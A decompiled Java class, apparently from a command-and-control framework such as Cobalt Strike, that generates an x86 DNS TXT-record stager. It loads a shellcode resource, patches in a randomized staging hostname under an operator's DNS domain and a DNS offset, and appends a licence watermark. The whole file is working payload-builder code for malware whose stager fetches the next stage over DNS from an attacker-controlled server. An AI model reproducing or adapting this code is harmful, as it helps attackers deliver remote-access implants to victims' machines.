package stagers;

import common.CommonUtils;
import common.Packer;
import common.ScListener;

public abstract class GenericDNSStagerX86 extends GenericStager {
   public GenericDNSStagerX86(ScListener var1) {
      super(var1);
   }

   public String arch() {
      return "x86";
   }

   public abstract String getDNSHost();

   public String getHost() {
      long var1 = (long)CommonUtils.rand(16777215);
      return ".stage." + var1 + "." + this.getDNSHost();
   }

   public byte[] generate() {
      String var1 = CommonUtils.bString(CommonUtils.readResource("resources/dnsstager.bin"));
      String var2 = this.getConfig().pad(this.getHost() + '\u0000', 60);
      if (var2.length() > 60) {
         CommonUtils.print_error("DNS Staging Host '" + var2 + "' is too long! (DNS TXT record stager will crash!)");
      }

      int var3 = var1.indexOf(".ABCDEFGHIJKLMNOPQRSTUVWXYZXXXX");
      var1 = CommonUtils.replaceAt(var1, var2, var3);
      Packer var4 = new Packer();
      var4.little();
      var4.addInt(this.getConfig().getDNSOffset());
      var1 = CommonUtils.replaceAt(var1, CommonUtils.bString(var4.getBytes()), 509) + this.getConfig().getWatermark();
      return CommonUtils.toBytes(var1);
   }
}
